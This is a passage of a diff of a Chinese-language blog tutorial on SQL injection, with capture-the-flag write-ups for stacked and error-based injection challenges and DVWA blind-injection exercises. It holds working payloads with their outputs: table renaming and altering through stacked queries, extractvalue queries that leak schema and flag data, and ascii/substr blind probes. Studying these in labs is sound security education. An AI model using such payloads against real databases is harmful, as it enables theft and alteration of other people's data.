operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"1919810931114514"</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"words"</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>说明有两个表，分别是 <code>words</code>  和 <code>1919810931114514</code></p>
 </li>
 <li>
 <p>分别查看这两个表的列</p>
-<pre class="highlight"><code class="sq">1';
+<pre><code class="language-sq">1';
 show columns from `words`;
 show columns from `1919810931114514`;#
 </code></pre>
 <p>返回数据如下</p>
-<pre class="highlight"><code class="php"><span class="hljs-keyword">array</span>(<span class="hljs-number">6</span>) &#123;
-  [<span class="hljs-number">0</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;id&quot;</span>
-  [<span class="hljs-number">1</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;int(10)&quot;</span>
-  [<span class="hljs-number">2</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;NO&quot;</span>
-  [<span class="hljs-number">3</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span>
-  [<span class="hljs-number">4</span>]=&gt;
-  <span class="hljs-literal">NULL</span>
-  [<span class="hljs-number">5</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span>
-&#125;
-
-<span class="hljs-keyword">array</span>(<span class="hljs-number">6</span>) &#123;
-  [<span class="hljs-number">0</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;data&quot;</span>
-  [<span class="hljs-number">1</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;varchar(20)&quot;</span>
-  [<span class="hljs-number">2</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;NO&quot;</span>
-  [<span class="hljs-number">3</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span>
-  [<span class="hljs-number">4</span>]=&gt;
-  <span class="hljs-literal">NULL</span>
-  [<span class="hljs-number">5</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span>
-&#125;
------------------------------------------------------------------------------------------------
-<span class="hljs-keyword">array</span>(<span class="hljs-number">6</span>) &#123;
-  [<span class="hljs-number">0</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;flag&quot;</span>
-  [<span class="hljs-number">1</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;varchar(100)&quot;</span>
-  [<span class="hljs-number">2</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;NO&quot;</span>
-  [<span class="hljs-number">3</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span>
-  [<span class="hljs-number">4</span>]=&gt;
-  <span class="hljs-literal">NULL</span>
-  [<span class="hljs-number">5</span>]=&gt;
-  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span>
-&#125;
-
-</code></pre>
-<p>发现<code>words</code>有<code>id</code>和<code>data</code>列，而<code>1919810931114514</code>有<code>flag</code>列。显然答案就是<code>flag</code>里面的内容，但问题是<code>select</code>被正则匹配阻止了注入，所以不能通过这样的方式来查询<code>flag</code>的内容。但可以发现，输入框的内容是输出<code>words</code>表的内容，所以考虑吧<code>1919810931114514</code>的表名改为<code>words</code>，然后通过万能密码来获得<code>flag</code></p>
+<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"id"</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"int(10)"</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"NO"</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">""</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token constant">NULL</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">""</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"data"</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"varchar(20)"</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"NO"</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">""</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="26"></td><td><pre>  <span class="token constant">NULL</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="28"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">""</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="33"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"flag"</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="35"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"varchar(100)"</span></pre></td></tr><tr><td data-num="36"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="37"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"NO"</span></pre></td></tr><tr><td data-num="38"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="39"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">""</span></pre></td></tr><tr><td data-num="40"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="41"></td><td><pre>  <span class="token constant">NULL</span></pre></td></tr><tr><td data-num="42"></td><td><pre>  <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=></span></pre></td></tr><tr><td data-num="43"></td><td><pre>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">""</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>发现 <code>words</code>  有 <code>id</code>  和 <code>data</code>  列，而 <code>1919810931114514</code>  有 <code>flag</code>  列。显然答案就是 <code>flag</code>  里面的内容，但问题是 <code>select</code>  被正则匹配阻止了注入，所以不能通过这样的方式来查询 <code>flag</code>  的内容。但可以发现，输入框的内容是输出 <code>words</code>  表的内容，所以考虑吧 <code>1919810931114514</code>  的表名改为 <code>words</code> ，然后通过万能密码来获得 <code>flag</code></p>
 </li>
 <li>
 <p>修改表名</p>
-<pre class="highlight"><code class="">1';
+<pre><code>1';
 rename table `words` to words2;
 rename table `1919810931114514` to words;
 alter table words change flag id varchar(100);
@@ -498,60 +399,60 @@ show columns from words;#
 </li>
 <li>
 <p>获得答案</p>
-<pre class="highlight"><code class="">1' or 1=1 #
+<pre><code>1' or 1=1 #
 </code></pre>
 </li>
 </ul>
-<h4 id="2极客大挑战-2019hardsql1"><a class="markdownIt-Anchor" href="#2极客大挑战-2019hardsql1"></a> 2.[极客大挑战 2019]HardSQL1</h4>
-<p>这道题发现万能密码、联合注入、堆叠注入、双写绕过都行不通。但可以使用报错注入，但还会过滤空格和and，所以用<code>^</code>或<code>|</code>来连接</p>
+<h4 id="2极客大挑战-2019hardsql1"><a class="markdownIt-Anchor" href="#2极客大挑战-2019hardsql1">#</a> 2.[极客大挑战 2019] HardSQL1</h4>
+<p>这道题发现万能密码、联合注入、堆叠注入、双写绕过都行不通。但可以使用报错注入，但还会过滤空格和 and，所以用 <code>^</code>  或 <code>|</code>  来连接</p>
 <ul>
 <li>
 <p>首先查看数据库名</p>
-<pre class="highlight"><code class="">1'^extractvalue(1,concat(0x7e,(database())))#
+<pre><code>1'^extractvalue(1,concat(0x7e,(database())))#
 </code></pre>
 <p>得到</p>
-<pre class="highlight"><code class="">XPATH syntax error: '~geek'
+<pre><code>XPATH syntax error: '~geek'
 </code></pre>
 </li>
 <li>
 <p>查看数据库表名</p>
-<pre class="highlight"><code class="">1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))#
+<pre><code>1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))#
 </code></pre>
-<p><code>information_schema</code>：可以看做是一个全局数据库，记录了所有的数据库名、表名、列名等</p>
-<p><code>table_schema</code>：数据表所属的数据库名</p>
-<p><code>like</code>：like操作符用于在where子句中搜索列中的指定模式。</p>
+<p><code>information_schema</code> ：可以看做是一个全局数据库，记录了所有的数据库名、表名、列名等</p>
+<p><code>table_schema</code> ：数据表所属的数据库名</p>
+<p><code>like</code> ：like 操作符用于在 where 子句中搜索列中的指定模式。</p>
 <p>结果得到</p>
-<pre class="highlight"><code class="">XPATH syntax error: '~H4rDsq1'
+<pre><code>XPATH syntax error: '~H4rDsq1'
 </code></pre>
 </li>
 <li>
 <p>查看数据库列名</p>
-<pre class="highlight"><code class="">1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))#
+<pre><code>1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))#
 </code></pre>
-<p><code>table_name</code>：数据表名</p>
+<p><code>table_name</code> ：数据表名</p>
 <p>得到的结果</p>
-<pre class="highlight"><code class="">XPATH syntax error: '~id,username,password'
+<pre><code>XPATH syntax error: '~id,username,password'
 </code></pre>
 </li>
 <li>
-<p>猜测flag在<code>password</code>字段中</p>
-<pre class="highlight"><code class="">1'^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))#
+<p>猜测 flag 在 <code>password</code>  字段中</p>
+<pre><code>1'^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))#
 </code></pre>
 <p>得到</p>
-<pre class="highlight"><code class="">XPATH syntax error: '~flag&#123;4c02c593-6680-4a0c-bbca-82'
+<pre><code>XPATH syntax error: '~flag&#123;4c02c593-6680-4a0c-bbca-82'
 </code></pre>
 <p>由于输出有长度限制，所以强制选取右边的几位</p>
-<pre class="highlight"><code class="">1'^extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))))#
+<pre><code>1'^extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))))#
 </code></pre>
 <p>得到</p>
-<pre class="highlight"><code class="">XPATH syntax error: '~3-6680-4a0c-bbca-82b9c809b60e&#125;'
+<pre><code>XPATH syntax error: '~3-6680-4a0c-bbca-82b9c809b60e&#125;'
 </code></pre>
 </li>
 </ul>
-<h2 id="2medium无法手工注入没有输入框这类"><a class="markdownIt-Anchor" href="#2medium无法手工注入没有输入框这类"></a> 2.Medium(无法手工注入，没有输入框这类)</h2>
-<p>相比于Low，Medium的防护措施是加入了<strong>mysql_real_escape_string()<strong>函数，该函数对</strong>\x00,\n,\r,',&quot;,\x1a</strong>进行转义，同时前端页面设置了下拉框，希望来控制用户输入。</p>
-<p>思路：用<strong>Burpsuite</strong>等工具截取http报文后修改参数，步骤和Low完全一样。</p>
-<h2 id="3盲注"><a class="markdownIt-Anchor" href="#3盲注"></a> 3.盲注</h2>
+<h2 id="2medium无法手工注入没有输入框这类"><a class="markdownIt-Anchor" href="#2medium无法手工注入没有输入框这类">#</a> 2.Medium (无法手工注入，没有输入框这类)</h2>
+<p>相比于 Low，Medium 的防护措施是加入了<strong> mysql_real_escape_string ()<strong> 函数，该函数对</strong> \x00,\n,\r,’,&quot;,\x1a</strong> 进行转义，同时前端页面设置了下拉框，希望来控制用户输入。</p>
+<p>思路：用<strong> Burpsuite</strong> 等工具截取 http 报文后修改参数，步骤和 Low 完全一样。</p>
+<h2 id="3盲注"><a class="markdownIt-Anchor" href="#3盲注">#</a> 3. 盲注</h2>
 <ul>
 <li>
 <p>现象：没有报错回显，只是显示是否正确</p>
@@ -563,14 +464,14 @@ show columns from words;#
 <p>一般过程</p>
 <ul>
 <li>判断是否存在注入，注入是字符型还是数字型</li>
-<li>猜测当前数据库名<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span>猜测数据库长度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span>猜测数据库名称</li>
-<li>猜测数据库表名<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span>猜测表的数量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span>猜测表的长度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span>猜测表的名称</li>
-<li>猜测表的字段名<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span>猜测列的数量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span>猜测列的长度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span>猜测列的名称</li>
+<li>猜测当前数据库名<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 猜测数据库长度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 猜测数据库名称</li>
+<li>猜测数据库表名<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 猜测表的数量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 猜测表的长度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 猜测表的名称</li>
+<li>猜测表的字段名<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 猜测列的数量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 猜测列的长度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 猜测列的名称</li>
 </ul>
 </li>
 <li>
 <p>经常使用的函数</p>
-<pre class="highlight"><code class="">length() 函数返回字符串的长度 
+<pre><code>length() 函数返回字符串的长度 
 substr() 截取字符串 （语法:SUBSTR(str,pos,len);）  
 ascii() 返回字符的ascii码 [将字符变为数字]
 sleep() 将程序挂起一段时间n秒 
@@ -578,33 +479,31 @@ if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个
 </code></pre>
 </li>
 </ul>
-<h3 id="1布尔盲注"><a class="markdownIt-Anchor" href="#1布尔盲注"></a> 1.布尔盲注</h3>
-<h5 id="dvwa盲注实验"><a class="markdownIt-Anchor" href="#dvwa盲注实验"></a> DVWA盲注实验</h5>
+<h3 id="1布尔盲注"><a class="markdownIt-Anchor" href="#1布尔盲注">#</a> 1. 布尔盲注</h3>
+<h5 id="dvwa盲注实验"><a class="markdownIt-Anchor" href="#dvwa盲注实验">#</a> DVWA 盲注实验</h5>
 <ul>
 <li>
 <p>判断注入类型</p>
-<pre class="highlight"><code class="">1 or 1=1 
+<pre><code>1 or 1=1 
 =&gt;User ID exists in the database.
 </code></pre>
 <p>再尝试</p>
-<pre class="highlight"><code class="">1 or 1=2
+<pre><code>1 or 1=2
 =&gt;User ID exists in the database.
 </code></pre>
-<p>因此是字符型注入，sql语句应该是</p>
-<pre class="highlight"><code class="sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">where</span> <span class="hljs-string">&#x27;input&#x27;</span>
-</code></pre>
-</li>
+<p>因此是字符型注入，sql 语句应该是</p>
+<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> table_name <span class="token keyword">where</span> <span class="token string">'input'</span></pre></td></tr></table></figure></li>
 <li>
 <p>判断数据库名长度</p>
-<pre class="highlight"><code class="">1' and length(database())=len#
+<pre><code>1' and length(database())=len#
 </code></pre>
-<p>这里去len=1,2,3都是返回<code>User ID is MISSING from the database.</code></p>
-<p>当取len=4的时候返回<code>User ID exists in the database.</code>所以判断数据库长度为4</p>
+<p>这里去 len=1,2,3 都是返回 <code>User ID is MISSING from the database.</code></p>
+<p>当取 len=4 的时候返回 <code>User ID exists in the database.</code>  所以判断数据库长度为 4</p>
 </li>
 <li>
 <p>猜测数据库的名称</p>
-<p>逐个判断数据名的每一个字符，用对应的ASCALL码来判断相等，这里常用二分法来判断。注意这里截取字符串开始下标是从1开始的</p>
-<pre class="highlight"><code class="">1' and ascii(substr(database(),1,1))&gt;90  #
+<p>逐个判断数据名的每一个字符，用对应的 ASCALL 码来判断相等，这里常用二分法来判断。注意这里截取字符串开始下标是从 1 开始的</p>
+<pre><code>1' and ascii(substr(database(),1,1))&gt;90  #
 =&gt;User ID exists in the database.
 
 1' and ascii(substr(database(),1,1))&gt;100 #
@@ -622,20 +521,20 @@ if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个
 1' and ascii(substr(database(),1,1))=100 #
 =&gt;User ID exists in the database.    确定是100
 </code></pre>
-<p>重复利用以上方法，可以得到数据名为<code>dvwa</code>。还可以通过burpsuite爆破或者数据库来源猜测</p>
+<p>重复利用以上方法，可以得到数据名为 <code>dvwa</code> 。还可以通过 burpsuite 爆破或者数据库来源猜测</p>
 </li>
 <li>
 <p>猜测表的数量</p>
 <p>table_name  表名称</p>
 <p>table_schema 数据表所属的数据库名</p>
-<pre class="highlight"><code class="">1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2 #
+<pre><code>1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2 #
 =&gt;User ID exists in the database. 所以表的数量是2
 </code></pre>
 </li>
 <li>
 <p>猜测表的长度</p>
-<p><code>limit i,j</code>和<code>select</code>共同使用：用于接收select查询的结果从第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span>行开始检索<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>行。一般<span class="katex"><span class="katex-mathml"><math 